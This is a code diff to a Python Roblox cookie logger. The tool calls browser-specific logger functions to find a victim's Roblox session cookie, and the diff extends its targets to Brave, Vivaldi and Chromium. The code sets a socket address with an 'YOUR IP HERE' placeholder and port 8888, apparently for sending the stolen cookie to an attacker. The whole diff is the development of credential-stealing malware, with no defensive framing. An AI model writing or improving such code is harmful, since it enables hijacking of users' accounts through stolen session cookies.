@@ -2,14 +2,14 @@ import socket
 from modules.loggers import *
 from modules.ThreadWithReturnValue import *
 
-addr = ('YOUR IP HERE:)', 8888)
+addr = ('YOUR IP HERE', 8888)
 
 
 def roblox_logger():
     finded_cookie = None
 
     browsers = [edge_logger, chrome_logger, firefox_logger,
-                opera_logger]  # imported function from './loggers.py'
+                opera_logger, brave_logger, vivaldi_logger, chromium_logger]  # improt function from './loggers.py'
     for x in browsers:
         ''' Gets the return value of finding a cookie.'''
         twrv = ThreadWithReturnValue(target=x)
@@ -22,7 +22,7 @@ def roblox_logger():
     if finded_cookie:
         return str(finded_cookie).encode()
     else:
-        return "False".encode()
+        return False
 
 
 if __name__ == '__main__':
